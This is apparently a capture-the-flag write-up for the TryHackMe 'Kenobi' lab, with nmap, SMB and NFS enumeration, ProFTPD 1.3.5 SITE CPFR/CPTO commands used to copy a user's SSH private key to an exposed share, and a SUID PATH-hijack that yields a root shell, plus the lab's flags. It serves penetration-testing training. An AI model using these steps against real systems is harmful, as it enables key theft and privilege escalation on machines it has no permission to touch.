@@ -1,0 +1,291 @@
+Nmap Scan
+
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi# nmap -p- -sC -sV -oA nmap/all 10.10.93.13
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 12:24 IST
+Nmap scan report for 10.10.93.13
+Host is up (0.21s latency).
+Not shown: 65524 closed ports
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         ProFTPD 1.3.5
+22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      48073/tcp   mountd
+|   100005  1,2,3      49803/udp   mountd
+|   100005  1,2,3      53115/tcp6  mountd
+|   100005  1,2,3      54061/udp6  mountd
+|   100021  1,3,4      38555/tcp6  nlockmgr
+|   100021  1,3,4      42550/udp6  nlockmgr
+|   100021  1,3,4      43711/tcp   nlockmgr
+|   100021  1,3,4      53971/udp   nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp  open  nfs_acl     2-3 (RPC #100227)
+33331/tcp open  mountd      1-3 (RPC #100005)
+43711/tcp open  nlockmgr    1-4 (RPC #100021)
+47055/tcp open  mountd      1-3 (RPC #100005)
+48073/tcp open  mountd      1-3 (RPC #100005)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2020-05-03T02:12:53-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-05-03T07:12:53
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1123.02 seconds
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi# 
+
+TASK 1
+
+#1	Scan the machine with nmap, how many ports are open?
+
+7 under 10000
+
+TASK 2
+
+#1	Using the nmap command above, how many shares have been found?
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.93.13\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.93.13\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.93.13\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
+
+
+#2	Using your machine, connect to the machines network share. Once you're connected, list the files on the share. What is the file can you see?
+
+smb: \> ls
+  .                                   D        0  Wed Sep  4 16:19:09 2019
+  ..                                  D        0  Wed Sep  4 16:26:07 2019
+  log.txt                             N    12237  Wed Sep  4 16:19:09 2019
+
+		9204224 blocks of size 1024. 6877100 blocks available
+
+Log.txt
+
+#3	What port is FTP running on?
+
+21
+
+#4	Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 
+
+In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.
+
+/var 
+
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi# nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.93.13
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 13:02 IST
+Nmap scan report for 10.10.93.13
+Host is up (0.53s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-ls: Volume /var
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
+| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
+| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
+| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
+| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
+| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
+| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
+| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
+| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
+|_
+| nfs-showmount: 
+|_  /var *
+| nfs-statfs: 
+|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|_  /var        9204224.0  1836532.0  6877096.0  22%   16.0T        32000
+
+Nmap done: 1 IP address (1 host up) scanned in 4.33 seconds
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi# 
+
+TASK 3
+
+#1	Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.
+What is the version?
+
+ProFTPD 1.3.5
+
+#2	We can use searchsploit to find exploits for a particular software version.
+
+Searchsploit is basically just a command line search tool for exploit-db.com.
+
+How many exploits are there for the ProFTPd running?
+
+3
+
+#4	We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
+
+I got the id_rsa in two ways 
+
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi# nc -nv 10.10.93.13 21
+(UNKNOWN) [10.10.93.13] 21 (ftp) open
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.13]
+SITE CPFR /home/kenobi/.ssh/id_rsa 
+350 File or directory exists, ready for destination name
+SITE CPTO /home/kenobi/share/id_rsa
+250 Copy successful
+421 Login timeout (300 seconds): closing control connection
+
+Moving the id_rsa to the share folder of kenobi since in the log file it states that the share folder is accessible by anonymous.
+
+
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi# nc -nv 10.10.93.13 21
+(UNKNOWN) [10.10.93.13] 21 (ftp) open
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.93.13]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+
+Second moving it to /var/tmp and we get the id_rsa after mounting the folder.
+
+#5	Lets mount the /var/tmp directory to our machine and User Flag
+
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi# mount 10.10.93.13:/var mnt/kenobiNFS
+
+root@natzsec:~/Desktop/tryhackme/oscp/kenobi/mnt/kenobiNFS/tmp# ls -la
+total 28
+drwxrwxrwt  6 root root 4096 May  3 13:15 .
+drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
+-rw-r--r--  1 natz natz 1675 May  3 13:15 id_rsa
+
+User Flag : d0b0f3f53b6caa532a83915e19224899
+
+
+TASK 4
+
+PRivileage Escalation:
+
+#1	SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.
+
+To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null
+
+What file looks particularly out of the ordinary? 
+
+/usr/bin/menu
+
+#2	Run the binary, how many options appear?
+
+3
+
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+
+#3	What is the root flag (/root/root.txt)?
+
+When we do string we can see that the curl is used for first option and uname is used for second.
+
+We can do a path manupulation by just making export PATH=/tmp:$PATH it will change the $PATH variable to our current directory. Once that is done we can copy the /bin/sh to /tmp folder then rename it to curl and run the /usr/bin/menu and select 1.
+As soon as we select one the executable will look of the curl executable in the first and formoremost directory, since we already manupulated the path and set the current path /tmp to $PATH variable the curl (renamed from sh) will execute and we will get a new root shell.
+
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# ls -la
+total 216
+drwxrwxrwt  9 root   root     4096 May  3 03:05 .
+drwxr-xr-x 23 root   root     4096 Sep  4  2019 ..
+-rwxrwxrwx  1 kenobi kenobi      8 May  3 03:05 curl
+drwxrwxrwt  2 root   root     4096 May  3 01:51 .font-unix
+drwxrwxrwt  2 root   root     4096 May  3 01:51 .ICE-unix
+-rwxrwxr-x  1 kenobi kenobi 176316 May  3 02:53 linpeas.sh
+drwx------  3 root   root     4096 May  3 01:51 systemd-private-0aa7a5910fb24c55b602810f44784ffd-systemd-timesyncd.service-EYOkco
+drwxrwxrwt  2 root   root     4096 May  3 01:51 .Test-unix
+drwx------  2 kenobi kenobi   4096 May  3 02:54 tmux-1000
+drwxrwxrwt  2 root   root     4096 May  3 01:51 .X11-unix
+drwxrwxrwt  2 root   root     4096 May  3 01:51 .XIM-unix
+# cd /root
+# ls -la
+total 32
+drwx------  3 root root 4096 Sep  4  2019 .
+drwxr-xr-x 23 root root 4096 Sep  4  2019 ..
+lrwxrwxrwx  1 root root    9 Sep  4  2019 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Sep  4  2019 .cache
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   33 Sep  4  2019 root.txt
+-rw-------  1 root root 5383 Sep  4  2019 .viminfo
+# cat root.txt
+177b3cd8562289f37382721c28381f02
+# 
